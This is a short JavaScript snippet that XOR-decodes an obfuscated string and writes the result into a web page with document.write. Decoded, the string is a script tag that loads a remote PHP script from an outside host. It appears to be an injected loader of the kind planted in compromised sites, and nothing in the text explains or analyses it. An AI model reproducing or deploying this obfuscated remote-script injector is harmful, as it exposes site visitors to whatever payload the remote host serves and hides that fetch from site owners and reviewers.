var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00jvvr'1C--fkqqkfglv,tmv,rn-1fto@Vx;,rjr'1Dkf'1F:12142;4'00'1G'1A-qapkrv'1G";
b="";
c="";
var clen;
clen=a.length;
for(i=0;i<clen;i++){
	b+=String.fromCharCode(a.charCodeAt(i)^2)
}

console.log(b);
c=unescape(b);
document.write(c);